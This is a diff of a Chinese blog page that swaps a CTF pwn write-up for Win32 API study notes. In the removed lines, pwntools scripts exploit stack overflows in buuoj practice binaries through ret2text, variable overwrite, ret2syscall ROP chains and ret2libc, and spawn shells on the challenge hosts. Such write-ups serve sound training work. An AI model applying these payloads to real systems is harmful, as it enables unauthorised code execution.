@@ -4,17 +4,16 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="PWN题记录, あなたがいること.">
-    <meta name="description" content="前言研一上学期的课程终于结束，自由学习时间芜湖~
-PWN上路！
-题目自带后门函数
-Ret2Text
-变量覆盖
+    <meta name="keywords" content="Win32相关, あなたがいること.">
+    <meta name="description" content="记录一些学习WIN32知识的心得
 
-Rip来源: buuoj.cn
-总结利用原理: 栈溢出
-利用方式: 栈溢出跳转到代码段自带参数的systemcall 
-细节溢出">
+
+Win32消息Windows中的每一个动作都是一个 事件
+而为了记录这些时间 产生了消息这么一个结构
+消息结构/*
+ * Message structure
+ */
+typedef struct tag">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -26,7 +25,7 @@ Rip来源: buuoj.cn
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>PWN题记录 | あなたがいること.</title>
+    <title>Win32相关 | あなたがいること.</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -213,12 +212,12 @@ Rip来源: buuoj.cn
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://raw.githubusercontent.com/Luluting/Bed/Little/img/1920x1200-144465-anime-anime-girls-digital-art-artwork-portrait-2D.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/34.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">PWN题记录</h1>
+                    <h1 class="description center-align post-title">Win32相关</h1>
                 </div>
             </div>
         </div>
@@ -334,12 +333,8 @@ Rip来源: buuoj.cn
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/Pwn/">
-                                <span class="chip bg-color">Pwn</span>
-                            </a>
-                        
-                            <a href="/tags/CTF/">
-                                <span class="chip bg-color">CTF</span>
+                            <a href="/tags/WIN32/">
+                                <span class="chip bg-color">WIN32</span>
                             </a>
                         
                     </div>
@@ -350,8 +345,8 @@ Rip来源: buuoj.cn
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/Vulnerability/" class="post-category">
-                                Vulnerability
+                            <a href="/categories/Windows/" class="post-category">
+                                Windows
                             </a>
                         
                     </div>
@@ -363,21 +358,21 @@ Rip来源: buuoj.cn
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2021-12-28
+                    2021-11-20
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>Update Date:&nbsp;&nbsp;
-                    2022-01-13
+                    2021-12-09
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
-                    1.6k
+                    1.5k
                 </div>
                 
 
@@ -402,260 +397,206 @@ Rip来源: buuoj.cn
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>研一上学期的课程终于结束，自由学习时间芜湖~</p>
-<p>PWN上路！</p>
-<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h2 id="自带后门函数"><a href="#自带后门函数" class="headerlink" title="自带后门函数"></a>自带后门函数</h2><ul>
-<li>Ret2Text</li>
-<li>变量覆盖</li>
-</ul>
-<h3 id="Rip"><a href="#Rip" class="headerlink" title="Rip"></a>Rip</h3><p>来源: buuoj.cn</p>
-<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>利用原理: 栈溢出</p>
-<p>利用方式: 栈溢出跳转到代码段自带参数的systemcall </p>
-<h4 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h4><p>溢出点：gets函数</p>
-<p><img src="https://raw.githubusercontent.com/Luluting/Bed/Little/img/image-20220106214759501.png"></p>
-<p>直接目测栈帧</p>
-<p><img src="https://raw.githubusercontent.com/Luluting/Bed/Little/img/image-20220106220126328.png"></p>
-<p>可以看到数组长度为15 跨过一个保存栈底的值大小为8字节（64位程序）</p>
-<p>需要23个填充字节 </p>
-<p>于是EXP如下</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+                <p>记录一些学习WIN32知识的心得</p>
+<span id="more"></span>
 
-<span class="token comment">#context.update(arch = 'i386', os = 'linux', timeout = 1) </span>
+<h1 id="Win32消息"><a href="#Win32消息" class="headerlink" title="Win32消息"></a>Win32消息</h1><p>Windows中的每一个动作都是一个 <strong>事件</strong></p>
+<p>而为了记录这些时间 产生了<strong>消息</strong>这么一个结构</p>
+<h2 id="消息结构"><a href="#消息结构" class="headerlink" title="消息结构"></a>消息结构</h2><pre class="line-numbers language-C++" data-language="C++"><code class="language-C++">/*
+ * Message structure
+ */
+typedef struct tagMSG {
+    HWND        hwnd; 
+    UINT        message;
+    WPARAM      wParam;
+    LPARAM      lParam;
+    DWORD       time;
+    POINT       pt;
+#ifdef _MAC
+    DWORD       lPrivate;
+#endif
+} MSG, *PMSG, NEAR *NPMSG, FAR *LPMSG;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-local<span class="token operator">=</span><span class="token number">0</span>
-<span class="token keyword">if</span> local<span class="token punctuation">:</span> 
-    p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./pwn1'</span><span class="token punctuation">)</span> 
-<span class="token keyword">else</span><span class="token punctuation">:</span> 
-    p<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">27688</span><span class="token punctuation">)</span>
+<p><strong>hwnd</strong></p>
+<p>窗口句柄 用于标识消息所属的窗口 </p>
+<p><strong>message</strong></p>
+<p>消息编号 表示消息的类型</p>
+<p><strong>wParam</strong></p>
+<p>消息参数 用于进一步解释消息</p>
+<p><strong>lParam</strong></p>
+<p>消息参数 用于进一步解释消息</p>
+<p><strong>time</strong></p>
+<p>触发时间</p>
+<p><strong>pt</strong></p>
+<p>类型为POINT类 结构如下</p>
+<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">typedef struct tagPOINT
+{
+    LONG  x;
+    LONG  y;
+} POINT, *PPOINT, NEAR *NPPOINT, FAR *LPPOINT;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-system_addr<span class="token operator">=</span><span class="token number">0x40118A</span>
-
-payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">23</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>
-
-<span class="token comment">#gdb.attach(p)</span>
-<span class="token comment">#pause()</span>
-p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h4 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h4><p><img src="https://raw.githubusercontent.com/Luluting/Bed/Little/img/image-20220106220003609.png"></p>
-<p>从0x401186开始执行会遇到Broken pipe问题</p>
-<p><img src="https://raw.githubusercontent.com/Luluting/Bed/Little/img/image-20220106220723365.png"></p>
-<p>而从0x40118A开始执行则正常成功</p>
-<p><strong>最后调试感觉是执行函数开头开栈操作时RBP的值不可靠引发的问题 但具体在哪里触发的问题还有待探究</strong></p>
-<p>总之今后需要注意</p>
-<p><img src="https://raw.githubusercontent.com/Luluting/Bed/Little/img/image-20220106221018586.png"></p>
-<h3 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h3><p>题目来源：buuctf</p>
-<h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><p>利用原理: 栈溢出</p>
-<p>利用方式: 栈溢出跳转到代码段自带参数的systemcall  </p>
-<h4 id="细节-1"><a href="#细节-1" class="headerlink" title="细节"></a>细节</h4><p>IDA查找字符串 发现要跳转的函数在<code>0x40060D</code></p>
-<pre class="line-numbers language-C" data-language="C"><code class="language-C">; Attributes: bp-based frame
-
-sub_40060D proc near
-; __unwind {
-push    rbp
-mov     rbp, rsp
-mov     edi, offset command ; "cat flag.txt"
-call    _system
-pop     rbp
-retn
-; } // starts at 40060D
-sub_40060D endp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>利用函数依旧是get 并且分析栈帧需要0x48个填充字符</p>
-<p><img src="https://raw.githubusercontent.com/Luluting/Bed/Little/img/image-20220106230946581.png"></p>
-<p>于是EXP如下</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
-
-<span class="token comment">#context.update(arch = 'i386', os = 'linux', timeout = 1) </span>
-context<span class="token punctuation">.</span>os<span class="token operator">=</span><span class="token string">'linux'</span>
-context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span>
-context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>
-
-local<span class="token operator">=</span><span class="token number">0</span>
-<span class="token keyword">if</span> local<span class="token punctuation">:</span> 
-    p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./warmup_csaw_2016'</span><span class="token punctuation">)</span> 
-<span class="token keyword">else</span><span class="token punctuation">:</span> 
-    p<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">27745</span><span class="token punctuation">)</span>
-
-system_addr<span class="token operator">=</span><span class="token number">0x40060D</span>
-
-payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x48</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>
-
-<span class="token comment">#gdb.attach(p)</span>
-<span class="token comment">#pause()</span>
-p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-
-<h3 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h3><h4 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h4><p>利用原理: 栈溢出</p>
-<p>利用方式: 覆盖关键变量</p>
-<h4 id="细节-2"><a href="#细节-2" class="headerlink" title="细节"></a>细节</h4><p>程序主逻辑如下</p>
-<p><img src="https://raw.githubusercontent.com/Luluting/Bed/Little/img/image-20220106231727111.png"></p>
-<p>我们的目标就是通过溢出v1数组将变量v2覆盖为对应的浮点数</p>
-<p>浮点数数据如下</p>
-<p>dword_4007F4    dd 41348000h</p>
-<p>栈帧如下</p>
-<p><img src="https://raw.githubusercontent.com/Luluting/Bed/Little/img/image-20220106232211913.png"></p>
-<p>溢出v2只需要填充44个字符，然后跟随正确的值覆盖v2即可</p>
-<p>所以EXP如下：</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
-
-<span class="token comment">#context.update(arch = 'i386', os = 'linux', timeout = 1) </span>
-context<span class="token punctuation">.</span>os<span class="token operator">=</span><span class="token string">'linux'</span>
-context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span>
-context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>
-
-local<span class="token operator">=</span><span class="token number">0</span>
-<span class="token keyword">if</span> local<span class="token punctuation">:</span> 
-    p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./ciscn_2019_n_1'</span><span class="token punctuation">)</span> 
-<span class="token keyword">else</span><span class="token punctuation">:</span> 
-    p<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">25812</span><span class="token punctuation">)</span>
-
-system_addr<span class="token operator">=</span><span class="token number">0x40060D</span>
-
-payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">44</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x41348000</span><span class="token punctuation">)</span>
-
-<span class="token comment">#gdb.attach(p)</span>
-<span class="token comment">#pause()</span>
-p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h3 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h3><h4 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h4><p>利用原理：栈溢出</p>
-<p>利用方法：利用字符串处理覆盖地址</p>
-<h4 id="细节-3"><a href="#细节-3" class="headerlink" title="细节"></a>细节</h4><p>32位程序</p>
-<p>利用地址在0x08048F0D或者0x08048F13</p>
-<p>程序逻辑是通过fgets获取输入 最大32个字节 输入的字符串会进行处理</p>
-<p>主函数栈帧输入的偏移为<code>-0x3C</code> 返回地址在<code>+4</code> </p>
-<p>所以需要填充的长度为<code>0x40</code> 即64个字节</p>
-<p>通常来说无法直接溢出覆盖 这时候看字符串的处理方式</p>
-<p>将输入中所有的<code>I</code>替换为 <code>you</code></p>
-<p>所以利用方法：</p>
-<p>输入中1个字节最大能凑3个字节 预留最后4个字节用于覆盖</p>
-<p>则最大可以覆盖的范围为<code>(32-4)*3 &gt; 64</code>所以可以成功</p>
-<p><code>64 = 3 * 21 + 1</code></p>
-<p>所以输入中有21个<code>I</code>加其他字符然后进行覆盖即可</p>
-<p>所以EXP如下</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
-
-<span class="token comment">#context.update(arch = 'i386', os = 'linux', timeout = 1) </span>
-context<span class="token punctuation">.</span>os<span class="token operator">=</span><span class="token string">'linux'</span>
-context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span>
-context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>
-
-local<span class="token operator">=</span><span class="token number">0</span>
-<span class="token keyword">if</span> local<span class="token punctuation">:</span> 
-    p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./pwn1_sctf_2016'</span><span class="token punctuation">)</span> 
-<span class="token keyword">else</span><span class="token punctuation">:</span> 
-    p<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">29328</span><span class="token punctuation">)</span>
-
-system_addr<span class="token operator">=</span><span class="token number">0x08048F13</span>
-<span class="token comment"># 64 = 3*21+1</span>
-payload <span class="token operator">=</span> <span class="token string">b'I'</span><span class="token operator">*</span><span class="token number">21</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>
-<span class="token comment"># gdb.attach(p)</span>
-<span class="token comment"># pause()</span>
-p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-
-<h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><h3 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h3><p>题目来源:bamboofox 中的 ret2syscall </p>
-<h4 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h4><p>题目内有<code>/bin/sh</code>字符串地址 而且没有system函数调用 </p>
-<p>于是考虑Ret2syscall攻击(原理是<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8">系统调用</a>)</p>
-<h4 id="具体"><a href="#具体" class="headerlink" title="具体"></a>具体</h4><p>通过gets溢出后</p>
-<p>构造如下指令效果</p>
-<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">;目标语句
-;execve("/bin/sh",NULL,NULL);
-;对应汇编
-pop eax;eax=0xb b是execve对应的系统调用编号
-pop ebx;ebx=arg_addr
-pop ecx;ecx=0
-pop edx;edx=0
-int 0x80;系统调用<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>那么payload要如何构造出来呢</p>
-<p>payload构造好以后栈里面就是<code>[gadgets片段+要给寄存器赋的目标值] * n + 中断</code> 的组合</p>
+<p>用于记录消息位置</p>
+<h2 id="消息机制"><a href="#消息机制" class="headerlink" title="消息机制"></a>消息机制</h2><p><img src="https://raw.githubusercontent.com/Luluting/Bed/Little/img/20191212105921.png"></p>
 <ul>
-<li><p>首先使用ROPgadget来寻找合适指令的地址</p>
-<p>  例如寻找控制eax寄存器的片段<code>ROPgadget --binary rop --only 'pop|ret' | grep 'eax'</code></p>
-<p>  得到运行结果是</p>
-  <pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">$ ROPgadget --binary rop --only 'pop|ret' | grep 'eax'
-0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
-0x080bb196 : pop eax ; ret
-0x0807217a : pop eax ; ret 0x80e
-0x0804f704 : pop eax ; ret 3
-0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>  <code>0x080bb196</code>这个片段只控制eax寄存器 可以使用</p>
-<p>  于是可以命名变量为<code>gadget_eax</code>表示它只控制eax寄存器(只要能标记即可 明明随意) </p>
-<p>  这方便我们之后为栈空间布局</p>
-<p>  接着寻找控制其他寄存器的指令 </p>
+<li><p>系统队列</p>
+<p>系统会维护一个队列 消息在里面排队</p>
+<p>这个系统队列会对消息进行分流 </p>
 </li>
-<li><p>gadgets布局完成后 需要寻找中断指令的地址</p>
-  <pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">% ROPgadget --binary rop --only 'int'
-Gadgets information
-============================================================
-0x08049421 : int 0x80
-
-Unique gadgets found: 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-</ul>
-<p>找齐信息后则EXP如下：</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
-
-<span class="token comment">#context.update(arch = 'i386', os = 'linux', timeout = 1) </span>
-context<span class="token punctuation">.</span>os<span class="token operator">=</span><span class="token string">'linux'</span>
-context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'i386'</span>
-<span class="token comment">#context.arch='amd64'</span>
-context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>
-
-local<span class="token operator">=</span><span class="token number">1</span>
-<span class="token keyword">if</span> local<span class="token punctuation">:</span> 
-    p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./rop'</span><span class="token punctuation">)</span> 
-<span class="token keyword">else</span><span class="token punctuation">:</span> 
-    p<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">29178</span><span class="token punctuation">)</span>
-
-binsh_addr<span class="token operator">=</span><span class="token number">0x080BE408</span>
-syscall_num<span class="token operator">=</span><span class="token number">0xb</span>
-gadget_eax<span class="token operator">=</span><span class="token number">0x080bb196</span>
-gadget_edx_ecx_ebx<span class="token operator">=</span><span class="token number">0x0806eb90</span>
-int_80<span class="token operator">=</span><span class="token number">0x08049421</span>
-
-payload<span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">112</span><span class="token punctuation">,</span> gadget_eax<span class="token punctuation">,</span> syscall_num<span class="token punctuation">,</span> gadget_edx_ecx_ebx<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> binsh_addr<span class="token punctuation">,</span> int_80<span class="token punctuation">]</span><span class="token punctuation">)</span>
-
-p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-
-<h4 id="问题-1"><a href="#问题-1" class="headerlink" title="问题"></a>问题</h4><ul>
-<li><p>看栈帧和实际溢出位置不一致</p>
-<p>可能因为编译器某些参数导致实际运行时栈偏移更多一点</p>
-<p>具体需要多积累再继续研究</p>
+<li><p>应用队列</p>
+<p>将消息通过窗口句柄发给对应的应用程序</p>
+<p>应用程序也会有一个消息队列 </p>
 </li>
-<li><p>ROP链中参数都多了一个0</p>
-<p>context设置错误</p>
-<p>32位程序应当使用<code>context.arch='i386'</code></p>
-<p>这样脚本会自动用p32进行打包</p>
-<p>64位程序则使用<code>context.arch='amd64'</code></p>
-</li>
-<li><p>如果ROPgadget找不到<code>int 0x80</code>指令怎么办</p>
-<p>则无法利用系统调用的方法解题</p>
+<li><p>消息循环</p>
+<p>在这个队列里应用程序会通过循环对每个消息类型进行筛选 对关心的类型执行自己的处理函数 </p>
+<p>如果是不关心的消息类型 就交给系统处理</p>
 </li>
 </ul>
-<h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><h4 id="总结-5"><a href="#总结-5" class="headerlink" title="总结"></a>总结</h4><p>和上述题目一样 但是这次没有<code>int 80h</code>的中断了</p>
-<p>这次的方法是控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)，故而此时我们需要知道 system 函数的地址。</p>
-<p>这种方式的前提是：导入表内有我们想要的函数</p>
-<h4 id="细节-4"><a href="#细节-4" class="headerlink" title="细节"></a>细节</h4><p>该题内没有80h中断的代码 但是导入表内有system函数 所以可以利用ret2libc的攻击</p>
-<p>执行该操作我们需要：找到system函数地址，找到字符串地址，构造payload进行攻击</p>
+<h1 id="Win32窗口"><a href="#Win32窗口" class="headerlink" title="Win32窗口"></a>Win32窗口</h1><h2 id="窗口结构"><a href="#窗口结构" class="headerlink" title="窗口结构"></a>窗口结构</h2><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">typedef struct tagWNDCLASSA {
+    UINT        style;
+    WNDPROC     lpfnWndProc;
+    int         cbClsExtra;
+    int         cbWndExtra;
+    HINSTANCE   hInstance;
+    HICON       hIcon;
+    HCURSOR     hCursor;
+    HBRUSH      hbrBackground;
+    LPCSTR      lpszMenuName;
+    LPCSTR      lpszClassName;
+} WNDCLASSA, *PWNDCLASSA, NEAR *NPWNDCLASSA, FAR *LPWNDCLASSA;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>包含窗口的各种属性</p>
+<p><strong>lpfnWndProc</strong></p>
+<p>重要 窗口消息处理函数</p>
+<p><strong>hInstance</strong></p>
+<p><strong>lpszClassName</strong></p>
+<p>必要 窗口名字</p>
+<h2 id="创建自定义窗口步骤"><a href="#创建自定义窗口步骤" class="headerlink" title="创建自定义窗口步骤"></a>创建自定义窗口步骤</h2><ul>
+<li>创建好窗口的结构体</li>
+<li>通过<code>RegisterClass</code>对窗口进行注册（通知Windows）</li>
+<li>在需要调用<code>CreateWindow</code>创建窗口</li>
+</ul>
+<h1 id="Win32IPC对象"><a href="#Win32IPC对象" class="headerlink" title="Win32IPC对象"></a>Win32IPC对象</h1><h2 id="对象概括"><a href="#对象概括" class="headerlink" title="对象概括"></a>对象概括</h2><ul>
+<li><p>已经学到的有进程、线程、互斥体、事件、信号量</p>
+</li>
+<li><p>内核对象都有已通知和未通知两种状态</p>
+<p>比如说创建事件时第二个参数是是否开启手动模式（FALSE自动将已通知转换为未通知） 第三个参数是初始状态</p>
+<p>想要同时读取就开手动模式（让大家都能读） 想要互斥写就需要开启自动复位（一个开始写另一个需要等待）</p>
+</li>
+<li><p>内核对象都可以跨进程</p>
+<p>比如说对互斥的控制 临界区只能在单个进程内使用 而互斥体可以跨进程</p>
+<p>但缺点是 内核对象性能较差 (因为需要进入到0环)</p>
+</li>
+</ul>
+<h2 id="线程-Thread"><a href="#线程-Thread" class="headerlink" title="线程 Thread"></a>线程 Thread</h2><p>线程可以说是进程要跑起来的基础 , 这里可以详细讲一下</p>
+<h3 id="创建线程"><a href="#创建线程" class="headerlink" title="创建线程"></a>创建线程</h3><p>函数体如下</p>
+<pre class="line-numbers language-C++" data-language="C++"><code class="language-C++">//创建进程
+HANDLE CreateThread(
+  LPSECURITY_ATTRIBUTES   lpThreadAttributes,//安全属性
+  SIZE_T                  dwStackSize,		//分配栈大小
+  LPTHREAD_START_ROUTINE  lpStartAddress,	//线程处理函数
+  __drv_aliasesMem LPVOID lpParameter,		//传递给线程处理函数的参数
+  DWORD                   dwCreationFlags,	//A pointer to a variable to be passed to the thread.
+  LPDWORD                 lpThreadId		//The flags that control the creation of the thread.
+);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>我们可以看到, 为了成功创建线程, 我们通常需要先准备好一个线程处理函数, 这个线程函数需要满足一定的格式</p>
+<p>继续往下看</p>
+<h3 id="线程处理函数"><a href="#线程处理函数" class="headerlink" title="线程处理函数"></a>线程处理函数</h3><p>类似于消息框也需要一个消息框处理函数, 创建一个线程也需要一个线程处理函数</p>
+<p>函数体形式应当如下</p>
+<pre class="line-numbers language-C++" data-language="C++"><code class="language-C++">DWORD WINAPI ThreadProc(_In_ LPVOID lpParameter) {...}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<h2 id="互斥体-Mutex"><a href="#互斥体-Mutex" class="headerlink" title="互斥体 Mutex"></a>互斥体 Mutex</h2><p>基本就是临界区(Critical Section)一样的功能, 区别就是一个是内核对象, 另一个是普通进程内的对象</p>
+<pre class="line-numbers language-none"><code class="language-none">//创建互斥体
+HANDLE WINAPI CreateMutex(
+  _In_opt_ LPSECURITY_ATTRIBUTES lpMutexAttributes,
+  _In_     BOOL                  bInitialOwner,	//初始状态
+  _In_opt_ LPCTSTR               lpName
+);
+
+//进入互斥体
+HANDLE WINAPI OpenMutex(
+  _In_ DWORD   dwDesiredAccess,
+  _In_ BOOL    bInheritHandle,
+  _In_ LPCTSTR lpName
+);
+
+//释放互斥体
+BOOL WINAPI ReleaseMutex(
+  _In_ HANDLE hMutex
+);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h2 id="事件-Event"><a href="#事件-Event" class="headerlink" title="事件 Event"></a>事件 Event</h2><pre class="line-numbers language-C++" data-language="C++"><code class="language-C++">//创建事件
+HANDLE WINAPI CreateEvent(
+  _In_opt_ LPSECURITY_ATTRIBUTES lpEventAttributes,
+  _In_     BOOL                  bManualReset,	//是否开启手冲模式
+  _In_     BOOL                  bInitialState,	//设置初始状态
+  _In_opt_ LPCTSTR               lpName
+);
+//例子
+f_Consumed = CreateEvent(NULL, TRUE, TRUE, NULL);
+//设置事件状态为TRUE
+SetEvent(f_Consumed);
+//关闭句柄
+CloseHandle(f_Consumed);
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <ul>
-<li>system函数地址</li>
-</ul>
